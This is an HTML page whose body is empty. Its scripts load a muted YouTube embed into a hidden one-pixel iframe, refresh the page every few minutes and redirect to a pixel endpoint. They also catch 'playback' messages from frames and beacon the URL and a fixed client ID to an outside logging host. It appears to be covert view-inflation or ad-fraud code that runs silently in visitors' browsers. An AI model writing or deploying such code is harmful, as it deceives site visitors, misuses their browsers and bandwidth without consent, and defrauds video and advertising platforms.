<meta http-equiv="refresh" content="600">
<meta name="referrer" content="no-referrer">
<meta name="robots" content="noindex">
<body>
</body>
<script>
var domain = 'distributively.com';
var time = Date.now();
if(window.location.host != domain) {
    window.location.href = "https://" + domain + "/pixel3.php" + window.location.search;
}

setTimeout(function() {
	try {
		document.getElementById("player").remove();
	} catch(ex){}
	window.location.reload();
}, 500*1000);


function createFrame(videoId, el, autoplay, cc, id) {
        var iframe = document.createElement('iframe');
        iframe.src = 'https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F'+ videoId +'%3Fenablejsapi%3D0%26autoplay%3d'+ autoplay + '%26mute%3d1%26el%26showinfo%3D0%26playsinline%3D0%26modestbranding%3D0%26rel%3D0%26loop%3D0%26cc_load_policy%3D' + cc +'%26origin%3D*';
        iframe.id = id;
        iframe.style.height="1px";
        iframe.style.width="1px";
        document.body.appendChild(iframe);
}
</script>
<iframe src="https://www.redditmedia.com/mediaembed/?ylm1&ylm=VwQkB6vUN6U"></iframe><script> var videoId = ''; el = ''; oid = ''; autoplay = 0; cc = '1';</script><script>
createFrame(videoId, el, 0, cc, "player");

var finalUrl = ""
var setInfo = 0

function getCookie(name){
    var pattern = RegExp(name + "=.[^;]*")
    var matched = document.cookie.match(pattern)
    if(matched){
        var cookie = matched[0].split('=')
        return cookie[1]
    }
    return false
}


function sendInfo(finalUrl) {
	var clientId = "1672044445175_6f124630566de3c663e7d8ad4df190c9201928e33656942d39727201b1f45";
	if (setInfo != 0) {
            return;
        }
        //setInfo = 1
        //notify_url("https://ultimateadb.com/logging_pb.php?clientId=" + getCookie("clientId") + "&url=" + encodeURIComponent(finalUrl));
        notify_url("https://ultimateadb.com/update.php?clientId=" + clientId + "&url=" + encodeURIComponent(finalUrl));
}

function notify_url(url) {
        var url = url;
        var img  = new Image();
        img.src = url;
        return false;
}

function find_frame(e) {
        var iframes = document.getElementsByTagName('iframe');
        for(var i = 0; i < iframes.length; i++) {
            if( e.source === iframes[i].contentWindow) {
                return iframes[i];
            }
        }

}



window.addEventListener('message', function(event) {
    try {
	    var json = JSON.parse(event.data)
	    if (json.type == 'playback') {
                finalUrl = json.message
		console.log(finalUrl);	
		//find_frame(event).remove()      
                sendInfo(finalUrl)
    	    }
        } catch(ex) {
                console.log(ex)
        }
    }
);

/*
try {
        fetch("https://ultimateadb.com/check_logs.php?clientId=" + getCookie("clientId")).then(function(response) {
            return response.json();
        }).then(function(jsonResponse) {
            if (jsonResponse.vid) {
			 createFrame(jsonResponse.vid, el, autoplay, 1, "player1");
		  }
        });
} catch (ex) {
	console.log(ex)
}
 */
</script>
